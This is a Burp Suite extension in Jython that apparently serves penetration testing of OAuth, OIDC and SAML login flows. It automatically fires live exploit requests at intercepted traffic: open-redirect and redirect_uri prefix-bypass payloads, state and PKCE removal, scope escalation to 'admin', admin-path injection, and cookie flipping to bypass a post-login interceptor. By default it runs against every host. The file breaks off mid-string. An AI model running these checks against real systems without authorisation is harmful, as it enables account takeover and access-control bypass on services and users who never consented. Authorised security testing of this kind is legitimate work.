# -*- coding: utf-8 -*-
"""
OAuthHunter v2.0 - Confirmed OAuth/OIDC/SAML Exploit Scanner
Burp Suite Extension - Jython 2.7

KEY DESIGN: ZERO passive guessing.
Every finding is CONFIRMED by actually sending a modified request and
verifying the response proves exploitability. No finding is added unless
we have proof the vulnerability is real.

Checks performed (all active, all confirmed):
  1. redirect_uri - tests if server ACTUALLY redirects to evil.com
  2. redirect_uri prefix bypass - Auth0 prefix match, confirmed by response Location
  3. State CSRF - replays request with no state, confirms server accepts it
  4. Scope escalation - sends elevated scope, confirms server grants it
  5. PKCE bypass - sends code flow without verifier, confirms server accepts
  6. Post-auth redirect param - injects redirect params, confirms 302 to target
  7. Cookie flag issues - ONLY reported if cookie actually missing flags (certain)
  8. SAML RelayState - sends modified RelayState, confirms redirect destination
  9. Interceptor/g2g bypass - flips cookie, confirms access to protected page

Install: Extender > Extensions > Add > Type: Python > Jython 2.7
"""

from burp import IBurpExtender, IHttpListener, ITab, IExtensionStateListener
from javax.swing import (JPanel, JTabbedPane, JTable, JScrollPane, JButton,
                          JTextArea, JLabel, JSplitPane, JTextField,
                          BorderFactory, SwingUtilities, JOptionPane,
                          JTree, BoxLayout, SwingConstants, JCheckBox)
from javax.swing.table import DefaultTableModel, DefaultTableCellRenderer
from javax.swing.tree import DefaultMutableTreeNode, DefaultTreeModel
from java.awt import (Color, Font, Dimension, BorderLayout, GridBagLayout,
                       GridBagConstraints, Insets, FlowLayout)
from java.awt.event import ActionListener, MouseAdapter
from java.lang import Runnable

import json
import base64
import time
import re

# ── Colours ──────────────────────────────────
C_BG      = Color(13,  17,  23)
C_SURFACE = Color(22,  27,  34)
C_BORDER  = Color(48,  54,  61)
C_ACCENT  = Color(88,  166, 255)
C_RED     = Color(248, 81,  73)
C_GREEN   = Color(63,  185, 80)
C_YELLOW  = Color(210, 153, 34)
C_TEXT    = Color(201, 209, 217)
C_MUTED   = Color(110, 118, 129)
C_ORANGE  = Color(210, 100, 30)

SEVERITY_COLORS = {
    "CRITICAL": Color(255, 50,  50),
    "HIGH":     Color(240, 100, 40),
    "MEDIUM":   Color(210, 153, 34),
    "LOW":      Color(63,  185, 80),
    "INFO":     Color(88,  166, 255),
}

# ── OAuth/SAML traffic detection ─────────────
OAUTH_PARAMS = set([
    "response_type", "client_id", "redirect_uri", "scope", "state",
    "code", "access_token", "id_token", "grant_type", "code_verifier",
    "code_challenge", "nonce", "prompt", "RelayState", "SAMLResponse",
    "SAMLRequest", "returnTo", "return_to", "next", "redirect", "goto",
    "wresult", "wctx", "wa", "token_type",
])

OAUTH_PATHS = [
    "/authorize", "/oauth/authorize", "/oauth2/authorize",
    "/login/callback", "/auth/callback", "/oauth/callback",
    "/saml/acs", "/saml2/acs", "/sso/saml", "/token",
    "/userinfo", "/authorize/resume", "/conversion/interceptor",
    "/usernamepassword/login",
]

REDIRECT_PARAMS = [
    "redirect_uri", "returnTo", "return_to", "next", "redirect",
    "goto", "continue", "url", "target", "dest", "postLogin",
    "landingPage", "after_login", "callback", "redirect_url",
]

# Canary domain for confirming open redirects
CANARY = "oauthhunter-confirmed.example.com"


# ─────────────────────────────────────────────
# CONFIRMATION LOGIC
# Each check returns (confirmed: bool, evidence: str)
# Only add finding if confirmed=True
# ─────────────────────────────────────────────

def confirm_open_redirect(helpers, callbacks, msg, param_name, param_value):
    """
    Test if redirect_uri / redirect param actually causes server to redirect
    to an external domain we control. Confirmed only if Location header
    contains our canary or server returns 3xx to non-original host.
    """
    analyzed = helpers.analyzeRequest(msg)
    params   = analyzed.getParameters()
    results  = []

    test_payloads = [
        "https://" + CANARY,
        "//" + CANARY,
        "https://" + CANARY + "@" + analyzed.getUrl().getHost(),
    ]

    for payload in test_payloads:
        req = msg.getRequest()
        for p in params:
            if str(p.getName()) == param_name:
                req = helpers.updateParameter(
                    req,
                    helpers.buildParameter(param_name, payload, p.getType()))
                break

        try:
            resp_msg  = callbacks.makeHttpRequest(msg.getHttpService(), req)
            resp      = resp_msg.getResponse()
            ar        = helpers.analyzeResponse(resp)
            status    = ar.getStatusCode()
            location  = ""
            for h in ar.getHeaders():
                if str(h).lower().startswith("location:"):
                    location = str(h)[9:].strip()
                    break

            # Confirmed: server 302s to our canary OR directly to payload
            if status in (301, 302, 303, 307, 308):
                if (CANARY in location or
                        payload in location or
                        ("error" not in location.lower() and
                         analyzed.getUrl().getHost() not in location and
                         location.startswith("http"))):
                    return True, "Server redirected to: {} (payload: {})".format(
                        location[:120], payload)

        except Exception as ex:
            pass

    return False, ""


def confirm_prefix_bypass(helpers, callbacks, msg, original_redirect_uri):
    """
    Confirm Auth0/OAuth prefix match: server accepts redirect_uri that
    STARTS WITH whitelisted value but has extra path/params appended.
    Confirmed if server returns 302 with our appended content in Location,
    OR if the auth code is delivered to our modified URI (not error page).
    """
    analyzed = helpers.analyzeRequest(msg)
    params   = analyzed.getParameters()

    suffixes = [
        "?next=https://" + CANARY,
        "?returnTo=https://" + CANARY,
        "?redirect=/" + CANARY,
        "%3Fnext%3Dhttps%3A%2F%2F" + CANARY,
        "#https://" + CANARY,
    ]

    for suffix in suffixes:
        payload = original_redirect_uri + suffix
        req = msg.getRequest()
        for p in params:
            if str(p.getName()) == "redirect_uri":
                req = helpers.updateParameter(
                    req,
                    helpers.buildParameter("redirect_uri", payload, p.getType()))
                break

        try:
            resp_msg  = callbacks.makeHttpRequest(msg.getHttpService(), req)
            resp      = resp_msg.getResponse()
            ar        = helpers.analyzeResponse(resp)
            status    = ar.getStatusCode()
            location  = ""
            for h in ar.getHeaders():
                if str(h).lower().startswith("location:"):
                    location = str(h)[9:].strip()
                    break
            body = helpers.bytesToString(resp)

            # Confirmed: no error AND redirected/code granted with modified URI
            if status in (301, 302, 303, 307, 308):
                if ("error" not in location.lower() and
                        "unauthorized" not in location.lower()):
                    if CANARY in location or "code=" in location:
                        return True, "Prefix bypass accepted. Location: {} suffix: {}".format(
                            location[:120], suffix)

            # Also: error reveals the modified URI was attempted (useful info)
            if "error_description" in body and CANARY in body:
                return True, "Server attempted redirect to modified URI (whitelist bypass attempted)"

        except Exception as ex:
            pass

    return False, ""


def confirm_state_csrf(helpers, callbacks, msg):
    """
    Remove state param entirely and replay. Confirmed if server still
    accepts the request (returns 302 to callback, not an error).
    """
    analyzed = helpers.analyzeRequest(msg)
    params   = analyzed.getParameters()
    req      = msg.getRequest()

    has_state = False
    for p in params:
        if str(p.getName()) == "state":
            has_state = True
            req = helpers.removeParameter(
                req,
                helpers.buildParameter("state", "", p.getType()))
            break

    if not has_state:
        return False, ""

    try:
        resp_msg = callbacks.makeHttpRequest(msg.getHttpService(), req)
        resp     = resp_msg.getResponse()
        ar       = helpers.analyzeResponse(resp)
        status   = ar.getStatusCode()
        location = ""
        for h in ar.getHeaders():
            if str(h).lower().startswith("location:"):
                location = str(h)[9:].strip()
                break

        # Confirmed: server proceeds with auth despite missing state
        if status in (200, 301, 302, 303) and "error" not in location.lower():
            if "code=" in location or "token=" in location or status == 200:
                return True, "Server accepted auth request without state param. Status: {} Location: {}".format(
                    status, location[:100])

    except Exception as ex:
        pass

    return False, ""


def confirm_pkce_bypass(helpers, callbacks, msg):
    """
    For code flow: send request without code_challenge.
    Confirmed if server returns auth code without requiring PKCE.
    """
    analyzed = helpers.analyzeRequest(msg)
    params   = analyzed.getParameters()
    req      = msg.getRequest()

    has_pkce = False
    for p in params:
        name = str(p.getName())
        if name in ("code_challenge", "code_challenge_method"):
            has_pkce = True
            req = helpers.removeParameter(
                req,
                helpers.buildParameter(name, "", p.getType()))

    rt = ""
    for p in params:
        if str(p.getName()) == "response_type":
            rt = str(p.getValue())
            break

    if "code" not in rt:
        return False, ""

    try:
        resp_msg = callbacks.makeHttpRequest(msg.getHttpService(), req)
        resp     = resp_msg.getResponse()
        ar       = helpers.analyzeResponse(resp)
        status   = ar.getStatusCode()
        location = ""
        for h in ar.getHeaders():
            if str(h).lower().startswith("location:"):
                location = str(h)[9:].strip()
                break

        if status in (301, 302) and "code=" in location:
            if "error" not in location.lower():
                return True, "Server issued auth code without PKCE. code in Location: {}".format(
                    location[:120])

    except Exception as ex:
        pass

    return False, ""


def confirm_scope_escalation(helpers, callbacks, msg):
    """
    Replace scope with elevated values. Confirmed if server grants
    a token/code with the elevated scope reflected in response.
    """
    analyzed = helpers.analyzeRequest(msg)
    params   = analyzed.getParameters()

    original_scope = "openid"
    for p in params:
        if str(p.getName()) == "scope":
            original_scope = str(p.getValue())
            break

    test_scopes = [
        original_scope + " admin",
        original_scope + " offline_access",
        "openid profile email admin",
        "admin",
    ]

    for scope in test_scopes:
        req = msg.getRequest()
        for p in params:
            if str(p.getName()) == "scope":
                req = helpers.updateParameter(
                    req,
                    helpers.buildParameter("scope", scope, p.getType()))
                break

        try:
            resp_msg = callbacks.makeHttpRequest(msg.getHttpService(), req)
            resp     = resp_msg.getResponse()
            ar       = helpers.analyzeResponse(resp)
            status   = ar.getStatusCode()
            location = ""
            for h in ar.getHeaders():
                if str(h).lower().startswith("location:"):
                    location = str(h)[9:].strip()
                    break
            body = helpers.bytesToString(resp)[:800]

            # Confirmed: elevated scope granted (no error, code returned)
            if status in (200, 302) and "error" not in location.lower():
                if "code=" in location or "access_token" in body:
                    return True, "Server accepted elevated scope '{}'. Status: {}".format(
                        scope, status)

        except Exception as ex:
            pass

    return False, ""


def confirm_redirect_param_injection(helpers, callbacks, msg, param_name):
    """
    Inject a known internal path into redirect params.
    Confirmed if server actually 302s to the injected path
    (not just same page or error).
    """
    analyzed = helpers.analyzeRequest(msg)
    params   = analyzed.getParameters()

    test_paths = ["/admin", "/admin/users", "/manage", "/config"]

    for path in test_paths:
        req = msg.getRequest()
        injected = False
        for p in params:
            if str(p.getName()) == param_name:
                req = helpers.updateParameter(
                    req,
                    helpers.buildParameter(param_name, path, p.getType()))
                injected = True
                break
        if not injected:
            req = helpers.addParameter(
                req,
                helpers.buildParameter(param_name, path, 0))

        try:
            resp_msg = callbacks.makeHttpRequest(msg.getHttpService(), req)
            resp     = resp_msg.getResponse()
            ar       = helpers.analyzeResponse(resp)
            status   = ar.getStatusCode()
            location = ""
            for h in ar.getHeaders():
                if str(h).lower().startswith("location:"):
                    location = str(h)[9:].strip()
                    break

            if status in (301, 302, 303) and path in location:
                return True, "Server redirected to injected path: {} via param: {}".format(
                    location[:100], param_name)

            # Also confirmed if we actually GET 200 on admin path
            if status == 200:
                body = helpers.bytesToString(resp)[:400]
                if "admin" in body.lower() or "dashboard" in body.lower():
                    return True, "Injected param='{}' val='{}' returned 200 with admin content".format(
                        param_name, path)

        except Exception as ex:
            pass

    return False, ""


def confirm_g2g_bypass(helpers, callbacks, msg, session_cookies):
    """
    Flip g2g/eg2g cookies and try to access a protected non-intercept page.
    Confirmed if we get 200 on dashboard/profile without hitting intercept.html.
    """
    service   = msg.getHttpService()
    host      = str(service.getHost())
    port      = service.getPort()
    protocol  = service.getProtocol()
    helpers_  = helpers

    test_paths = ["/en/dashboard.html", "/en/profile/manage",
                  "/dombff-profile/profile", "/en/admin"]

    for path in test_paths:
        for g2g_val in ["false", "0", ""]:
            # Build minimal GET request with flipped g2g cookie
            cookie_str = ""
            for name, val in session_cookies.items():
                if name.lower() == "g2g":
                    cookie_str += "g2g={}; ".format(g2g_val)
                elif name.lower() == "eg2g":
                    cookie_str += "eg2g={}; ".format(g2g_val)
                else:
                    cookie_str += "{}={}; ".format(name, val)

            raw = ("GET {} HTTP/1.1\r\n"
                   "Host: {}\r\n"
                   "Cookie: {}\r\n"
                   "User-Agent: Mozilla/5.0\r\n"
                   "Accept: text/html,*/*\r\n"
                   "Connection: close\r\n\r\n").format(path, host, cookie_str)

            try:
                from java.net import URL as JURL
                from burp import IHttpService
                resp_msg = callbacks.makeHttpRequest(service,
                                                     helpers_.stringToBytes(raw))
                resp     = resp_msg.getResponse()
                ar       = helpers_.analyzeResponse(resp)
                status   = ar.getStatusCode()
                location = ""
                for h in ar.getHeaders():
                    if str(h).lower().startswith("location:"):
                        location = str(h)[9:].strip()
                        break
                body = helpers_.bytesToString(resp)[:600]

                if status == 200 and "intercept" not in body.lower():
                    return True, "g2g={} bypassed interceptor. {} returned 200 without intercept page.".format(
                        g2g_val, path)
                if status in (301, 302) and "intercept" not in location:
                    return True, "g2g={} on {} redirected to {} (not intercept)".format(
                        g2g_val, path, location[:80])

            except Exception as ex:
                pass

    return False, ""


def confirm_cookie_flags(cookie_header):
    """
    Check cookie flags — this one IS passive but only for certain
    security-critical auth cookies, and only reports CONFIRMED missing flags.
    Returns (confirmed, evidence) — confirmed=True means flags actually missing.
    """
    parts = cookie_header[11:].strip() if cookie_header.lower().startswith("set-cookie:") else cookie_header
    name  = parts.split("=")[0].strip()
    low   = parts.lower()

    # Only check auth-critical cookies, not random app cookies
    critical = ["auth0", "auth0_compat", "access_token", "id_token",
                "session", "sid", "token"]
    if not any(name.lower() == c for c in critical):
        return False, ""

    missing = []
    if "httponly" not in low: missing.append("HttpOnly")
    if "secure"   not in low: missing.append("Secure")
    if "samesite" not in low: missing.append("SameSite")

    if missing:
        return True, "Cookie '{}' is missing: {}".format(name, ", ".join(missing))
    return False, ""


def confirm_saml_relaystate(helpers, callbacks, msg):
    """
    Modify RelayState to external URL. Confirmed if response
    Location contains our injected value.
    """
    analyzed = helpers.analyzeRequest(msg)
    params   = analyzed.getParameters()

    for payload in ["https://" + CANARY, "//" + CANARY]:
        req = msg.getRequest()
        for p in params:
            if str(p.getName()) == "RelayState":
                req = helpers.updateParameter(
                    req,
                    helpers.buildParameter("RelayState", payload, p.getType()))
                break

        try:
            resp_msg = callbacks.makeHttpRequest(msg.getHttpService(), req)
            resp     = resp_msg.getResponse()
            ar       = helpers.analyzeResponse(resp)
            status   = ar.getStatusCode()
            location = ""
            for h in ar.getHeaders():
                if str(h).lower().startswith("location:"):
                    location = str(h)[9:].strip()
                    break

            if CANARY in location or payload in location:
                return True, "RelayState injection confirmed. Location: {}".format(
                    location[:120])

        except Exception as ex:
            pass

    return False, ""


# ── Non-editable table model ──────────────────
class ReadOnlyTableModel(DefaultTableModel):
    def isCellEditable(self, row, col):
        return False


# ── Cell renderers ────────────────────────────
class SeverityRenderer(DefaultTableCellRenderer):
    def getTableCellRendererComponent(self, table, value, isSelected,
                                       hasFocus, row, col):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(
            self, table, value, isSelected, hasFocus, row, col)
        if col == 2:
            self.setForeground(SEVERITY_COLORS.get(str(value), C_TEXT))
            self.setFont(Font("Monospaced", Font.BOLD, 11))
        else:
            self.setForeground(C_TEXT)
            self.setFont(Font("Monospaced", Font.PLAIN, 11))
        self.setBackground(C_SURFACE if not isSelected else C_ACCENT.darker())
        return c


# ── Action listeners ──────────────────────────
class PauseAction(ActionListener):
    def __init__(self, ext, btn):
        self.ext = ext
        self.btn = btn

    def actionPerformed(self, evt):
        self.ext._paused = not self.ext._paused
        if self.ext._paused:
            self.btn.setText("Resume")
            self.btn.setForeground(C_GREEN)
        else:
            self.btn.setText("Pause")
            self.btn.setForeground(C_YELLOW)


class ClearAction(ActionListener):
    def __init__(self, ext):
        self.ext = ext

    def actionPerformed(self, evt):
        e = self.ext
        e.all_findings = []
        e.tested.clear()
        e._findings_model.setRowCount(0)
        e._log("Cleared.")


class ExportAction(ActionListener):
    def __init__(self, ext):
        self.ext = ext

    def actionPerformed(self, evt):
        try:
            data = [{k: v for k, v in f.items() if k != "messageInfo"}
                    for f in self.ext.all_findings]
            path = "/tmp/oauthhunter_confirmed.json"
            with open(path, "w") as fp:
                json.dump(data, fp, indent=2, default=str)
            self.ext._log("Exported to " + path)
            JOptionPane.showMessageDialog(None, "Saved: " + path,
                "Export", JOptionPane.INFORMATION_MESSAGE)
        except Exception as ex:
            self.ext._log("Export error: " + str(ex))


class SaveSettingsAction(ActionListener):
    def __init__(self, ext, scope_field, auto_cb):
        self.ext        = ext
        self.scope_field = scope_field
        self.auto_cb    = auto_cb

    def actionPerformed(self, evt):
        self.ext.scope_filter = [s.strip() for s in
                                  self.scope_field.getText().split(",")
                                  if s.strip()]
        self.ext.auto_active = self.auto_cb.isSelected()
        self.ext._log("Settings saved.")


class FindingSelectListener(MouseAdapter):
    def __init__(self, ext, table, detail):
        self.ext    = ext
        self.table  = table
        self.detail = detail

    def mouseClicked(self, evt):
        row = self.table.getSelectedRow()
        if 0 <= row < len(self.ext.all_findings):
            f = self.ext.all_findings[row]
            self.detail.setText(
                "CONFIRMED VULNERABILITY\n"
                "=" * 50 + "\n"
                "Name:       {}\n"
                "Severity:   {}\n"
                "CWE:        {}\n"
                "Host:       {}\n"
                "Path:       {}\n"
                "Time:       {}\n\n"
                "PROOF OF EXPLOIT:\n{}\n\n"
                "Request that triggered it:\n{}\n"
            ).format(
                f["name"], f["severity"], f["cwe"],
                f["host"], f["path"], f["timestamp"],
                f["evidence"],
                f.get("request_summary", "(see Burp history)")
            )
            self.detail.setCaretPosition(0)


class ClearLogAction(ActionListener):
    def __init__(self, area):
        self.area = area

    def actionPerformed(self, evt):
        self.area.setText("")


# ── Runnable UI updaters ──────────────────────
class AddFindingRow(Runnable):
    def __init__(self, ext, finding):
        self.ext     = ext
        self.finding = finding

    def run(self):
        f = self.finding
        self.ext._findings_model.addRow([
            f["timestamp"], f["host"], f["severity"],
            f["name"], f["path"][:55], f["cwe"]
        ])


class AppendLog(Runnable):
    def __init__(self, ext, line):
        self.ext  = ext
        self.line = line

    def run(self):
        try:
            a = self.ext._log_area
            a.append(self.line)
            a.setCaretPosition(a.getDocument().getLength())
        except Exception:
            pass


# ── Active confirm runner (per request) ──────
class ConfirmRunner(Runnable):
    """
    Runs all relevant confirmation checks against a single captured
    OAuth/SAML request. Only adds findings when exploitation is confirmed.
    """
    def __init__(self, ext, msg, param_map, path, host, session_cookies):
        self.ext             = ext
        self.msg             = msg
        self.param_map       = param_map
        self.path            = path
        self.host            = host
        self.session_cookies = session_cookies

    def run(self):
        e        = self.ext
        h        = e._helpers
        cb       = e._callbacks
        pm       = self.param_map
        path     = self.path
        host     = self.host
        msg      = self.msg

        # 1. Open redirect on any redirect param
        for rp in REDIRECT_PARAMS:
            if rp in pm:
                key = "open_redirect:{}:{}".format(host, rp)
                if key not in e.tested:
                    e.tested.add(key)
                    confirmed, evidence = confirm_open_redirect(h, cb, msg, rp, pm[rp])
                    if confirmed:
                        e._add_finding(host, path, msg,
                            "Open Redirect via '{}'".format(rp),
                            "HIGH", "CWE-601", evidence)

        # 2. Prefix bypass on redirect_uri
        if "redirect_uri" in pm:
            key = "prefix:{}:{}".format(host, path)
            if key not in e.tested:
                e.tested.add(key)
                confirmed, evidence = confirm_prefix_bypass(
                    h, cb, msg, pm["redirect_uri"])
                if confirmed:
                    e._add_finding(host, path, msg,
                        "redirect_uri Prefix Match Bypass (Auth0/OAuth)",
                        "HIGH", "CWE-183", evidence)

        # 3. State CSRF
        if "response_type" in pm:
            key = "state_csrf:{}:{}".format(host, path)
            if key not in e.tested:
                e.tested.add(key)
                confirmed, evidence = confirm_state_csrf(h, cb, msg)
                if confirmed:
                    e._add_finding(host, path, msg,
                        "Missing State - CSRF Login Attack Confirmed",
                        "HIGH", "CWE-352", evidence)

        # 4. PKCE bypass
        if pm.get("response_type") == "code":
            key = "pkce:{}:{}".format(host, path)
            if key not in e.tested:
                e.tested.add(key)
                confirmed, evidence = confirm_pkce_bypass(h, cb, msg)
                if confirmed:
                    e._add_finding(host, path, msg,
                        "PKCE Bypass - Auth Code Issued Without Verifier",
                        "MEDIUM", "CWE-345", evidence)

        # 5. Scope escalation
        if "scope" in pm and "response_type" in pm:
            key = "scope:{}:{}".format(host, path)
            if key not in e.tested:
                e.tested.add(key)
                confirmed, evidence = confirm_scope_escalation(h, cb, msg)
                if confirmed:
                    e._add_finding(host, path, msg,
                        "OAuth Scope Escalation Confirmed",
                        "HIGH", "CWE-269", evidence)

        # 6. Redirect param injection (post-auth)
        for rp in ["returnTo", "return_to", "next", "goto", "postLogin",
                   "landingPage", "after_login"]:
            if rp in pm:
                key = "redir_inject:{}:{}:{}".format(host, path, rp)
                if key not in e.tested:
                    e.tested.add(key)
                    confirmed, evidence = confirm_redirect_param_injection(
                        h, cb, msg, rp)
                    if confirmed:
                        e._add_finding(host, path, msg,
                            "Post-Auth Redirect Injection via '{}'".format(rp),
                            "HIGH", "CWE-601", evidence)

        # 7. g2g/interceptor bypass (only if those cookies seen)
        if self.session_cookies and any(
                k.lower() in ("g2g", "eg2g") for k in self.session_cookies):
            key = "g2g:{}".format(host)
            if key not in e.tested:
                e.tested.add(key)
                confirmed, evidence = confirm_g2g_bypass(
                    h, cb, msg, self.session_cookies)
                if confirmed:
                    e._add_finding(host, path, msg,
                        "Post-Login Interceptor (g2g) Bypass Confirmed",
                        "CRITICAL", "CWE-284", evidence)

        # 8. SAML RelayState
        if "RelayState" in pm:
            key = "relaystate:{}:{}".format(host, path)
            if key not in e.tested:
                e.tested.add(key)
                confirmed, evidence = confirm_saml_relaystate(h, cb, msg)
                if confirmed:
                    e._add_finding(host, path, msg,
                        "SAML RelayState Open Redirect Confirmed",
                        "HIGH", "CWE-601", evidence)

        e._log("Scan complete for {}{}".format(host, path))


# ── Main extension ────────────────────────────
class BurpExtender(IBurpExtender, IHttpListener, ITab, IExtensionStateListener):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks   = callbacks
        self._helpers     = callbacks.getHelpers()
        callbacks.setExtensionName("OAuthHunter v2")
        callbacks.registerHttpListener(self)
        callbacks.registerExtensionStateListener(self)

        self.all_findings    = []
        self.tested          = set()      # dedup: don't test same endpoint twice
        self.session_cookies = {}         # latest cookies seen per host
        self._paused         = False
        self.auto_active     = True       # run confirmations automatically
        self.scope_filter    = []

        SwingUtilities.invokeLater(BuildUI(self))
        callbacks.addSuiteTab(self)
        print("[OAuthHunter v2] Loaded. CONFIRMED EXPLOITS ONLY.")

    def getTabCaption(self):
        return "OAuthHunter"

    def getUiComponent(self):
        return self._main_panel

    def extensionUnloaded(self):
        print("[OAuthHunter v2] Unloaded.")

    # ── HTTP listener ─────────────────────────
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if self._paused:
            return
        try:
            if messageIsRequest:
                self._on_request(messageInfo)
            else:
                self._on_response(messageInfo)
        except Exception:
            pass

    def _on_request(self, msg):
        analyzed = self._helpers.analyzeRequest(msg)
        url      = analyzed.getUrl()
        host     = str(url.getHost())
        path     = str(url.getPath())
        params   = analyzed.getParameters()

        if self.scope_filter:
            if not any(h in host for h in self.scope_filter):
                return

        param_map = {}
        for p in params:
            param_map[str(p.getName())] = str(p.getValue())

        # Is this OAuth/SAML traffic?
        is_oauth = (any(k in param_map for k in OAUTH_PARAMS) or
                    any(seg in path for seg in OAUTH_PATHS))
        if not is_oauth:
            return

        self._log("OAuth traffic: {} {}{}".format(
            analyzed.getMethod(), host, path))

        if not self.auto_active:
            return

        # Grab latest session cookies for this host
        cookies = self.session_cookies.get(host, {})

        # Run confirmations in background thread
        from java.lang import Thread as JThread
        runner = ConfirmRunner(self, msg, param_map, path, host, cookies)
        t = JThread(runner)
        t.setDaemon(True)
        t.start()

    def _on_response(self, msg):
        analyzed_req  = self._helpers.analyzeRequest(msg)
        analyzed_resp = self._helpers.analyzeResponse(msg.getResponse())
        host  = str(analyzed_req.getUrl().getHost())

        if self.scope_filter:
            if not any(h in host for h in self.scope_filter):
                return

        # Track cookies per host for g2g bypass testing
        for h in analyzed_resp.getHeaders():
            hs = str(h)
            if hs.lower().startswith("set-cookie:"):
                parts = hs[11:].strip()
                name  = parts.split("=")[0].strip()
                val   = parts.split("=")[1].split(";")[0].strip() if "=" in parts else ""
                if host not in self.session_cookies:
                    self.session_cookies[host] = {}
                self.session_cookies[host][name] = val

                # Check critical auth cookie flags (only certain cookies)
                confirmed, evidence = confirm_cookie_flags(hs)
                if confirmed:
                    path = str(analyzed_req.getUrl().getPath())
                    key  = "cookie:{}:{}".format(host, name)
                    if key not in self.tested:
                        self.tested.add(key)
                        self._add_finding(host, path, msg,
                            "Auth Cookie '{}' Missing Security Flags".format(name),
                            "LOW", "CWE-614", evidence)

    # ── Add confirmed finding ─────────────────
    def _add_finding(self, host, path, msg, name, severity, cwe, evidence):
        finding = {
            "host":      host,
            "path":      path,
            "name":      name,
            "severity":  severity,
            "cwe":       cwe,
            "evidence":  evidence,
            "timestamp": time.strftime("%H:%M:%S"),
            "messageInfo": msg,
            "request_summary": "{}{}".format(host, path),
        }
        self.all_findings.append(finding)
        self._log("[CONFIRMED][{}] {} on {}{}".format(
            severity, name, host, path))
        SwingUtilities.invokeLater(AddFindingRow(self, finding))

    def _log(self, msg):
        line = "[{}] {}\n".format(time.strftime("%H:%M:%S"), str(msg))
        SwingUtilities.invokeLater(AppendLog(self, line))


# ── UI builder ────────────────────────────────
class BuildUI(Runnable):
    def __init__(self, ext):
        self.ext = ext

    def run(self):
        e    = self.ext
        main = JPanel(BorderLayout())
        main.setBackground(C_BG)
        e._main_panel = main

        tabs = JTabbedPane()
        tabs.setBackground(C_SURFACE)
        tabs.setForeground(C_TEXT)
        tabs.setFont(Font("Monospaced", Font.BOLD, 12))
        e._tabs = tabs

        tabs.addTab("Confirmed Findings", self._findings_tab())
        tabs.addTab("Settings",           self._settings_tab())
        tabs.addTab("Log",                self._log_tab())

        main.add(self._header(), BorderLayout.NORTH)
        main.add(tabs, BorderLayout.CENTER)

    def _header(self):
        e = self.ext
        p = JPanel(BorderLayout())
        p.setBackground(C_SURFACE)
        p.setBorder(BorderFactory.createMatteBorder(0, 0, 2, 0, C_ACCENT))

        lbl = JLabel("  OAuthHunter v2  -  Confirmed Exploits Only  |  No False Positives")
        lbl.setFont(Font("Monospaced", Font.BOLD, 13))
        lbl.setForeground(C_ACCENT)

        btns = JPanel(FlowLayout(FlowLayout.RIGHT, 6, 4))
        btns.setBackground(C_SURFACE)

        pause_btn  = self._btn("Pause",       C_YELLOW)
        clear_btn  = self._btn("Clear",       C_MUTED)
        export_btn = self._btn("Export JSON", C_GREEN)

        pause_btn.addActionListener(PauseAction(e, pause_btn))
        clear_btn.addActionListener(ClearAction(e))
        export_btn.addActionListener(ExportAction(e))

        btns.add(pause_btn)
        btns.add(clear_btn)
        btns.add(export_btn)

        p.add(lbl,  BorderLayout.WEST)
        p.add(btns, BorderLayout.EAST)
        return p

    def _findings_tab(self):
        e = self.ext
        p = JPanel(BorderLayout())
        p.setBackground(C_BG)

        cols  = ["Time", "Host", "Severity", "Vulnerability", "Path", "CWE"]
        model = ReadOnlyTableModel(cols, 0)
        e._findings_model = model

        table = self._table(model)
        sev_r = SeverityRenderer()
        for i in range(len(cols)):
            table.getColumnModel().getColumn(i).setCellRenderer(sev_r)

        for i, w in enumerate([65, 170, 80, 300, 190, 80]):
            table.getColumnModel().getColumn(i).setPreferredWidth(w)

        detail = self._textarea()
        detail.setText(
            "Select a finding to see proof of exploit.\n\n"
            "All findings here are CONFIRMED — a real request was sent\n"
            "and the response verified the vulnerability is exploitable.\n"
            "No pattern matching. No guessing."
        )
        table.addMouseListener(FindingSelectListener(e, table, detail))

        note = JLabel(
            "  Every finding below was confirmed by sending a real exploit request and verifying the response.")
        note.setFont(Font("Monospaced", Font.PLAIN, 11))
        note.setForeground(C_GREEN)

        split = JSplitPane(JSplitPane.VERTICAL_SPLIT,
                           JScrollPane(table), JScrollPane(detail))
        split.setResizeWeight(0.55)
        split.setBackground(C_BG)

        p.add(note,  BorderLayout.NORTH)
        p.add(split, BorderLayout.CENTER)
        return p

    def _settings_tab(self):
        e = self.ext
        p = JPanel(GridBagLayout())
        p.setBackground(C_BG)
        gbc        = GridBagConstraints()
        gbc.insets = Insets(10, 14, 10, 14)
        gbc.fill   = GridBagConstraints.HORIZONTAL

        scope_field = JTextField("", 40)
        scope_field.setBackground(C_SURFACE)
        scope_field.setForeground(C_TEXT)
        scope_field.setFont(Font("Monospaced", Font.PLAIN, 11))

        auto_cb = JCheckBox(
            "Auto-confirm on every OAuth request (recommended)", True)
        auto_cb.setBackground(C_BG)
        auto_cb.setForeground(C_TEXT)
        auto_cb.setFont(Font("Monospaced", Font.PLAIN, 11))

        save_btn = self._btn("Save", C_GREEN)
        save_btn.addActionListener(SaveSettingsAction(e, scope_field, auto_cb))

        gbc.gridx, gbc.gridy, gbc.weightx = 0, 0, 0
        lbl = JLabel("Scope filter (hosts, blank=all):")
        lbl.setFont(Font("Monospaced", Font.BOLD, 11))
        lbl.setForeground(C_ACCENT)
        p.add(lbl, gbc)
        gbc.gridx, gbc.weightx = 1, 1.0
        p.add(scope_field, gbc)

        gbc.gridx, gbc.gridy, gbc.weightx = 0, 1, 0
        p.add(auto_cb, gbc)

        gbc.gridx, gbc.gridy = 1, 2
        p.add(save_btn, gbc)

        info = self._textarea()
        info.setEditable(False)
        info.setForeground(C_MUTED)
        info.setText(
            "\nOAuthHunter v2 - How it works:\n\n"
            "Unlike v1, this version ONLY reports vulnerabilities it can\n"
            "prove by sending real HTTP requests and checking responses.\n\n"
            "Workflow:\n"
            "  1. Browse through an OAuth/SAML login flow normally.\n"
            "  2. OAuthHunter detects OAuth traffic automatically.\n"
            "  3. For each OAuth request, it fires confirmation payloads\n"
            "     in a background thread.\n"
            "  4. ONLY confirmed exploits appear in the Findings tab.\n\n"
            "Checks performed:\n"
            "  - Open redirect (redirect_uri, returnTo, next, etc.)\n"
            "  - redirect_uri prefix match bypass (Auth0 style)\n"
            "  - State/CSRF - replays without state, confirms acceptance\n"
            "  - PKCE bypass - removes code_challenge, confirms code issued\n"
            "  - Scope escalation - elevated scope confirmed by server\n"
            "  - Post-auth redirect param injection\n"
            "  - g2g/interceptor cookie bypass (confirmed by 200 on protected page)\n"
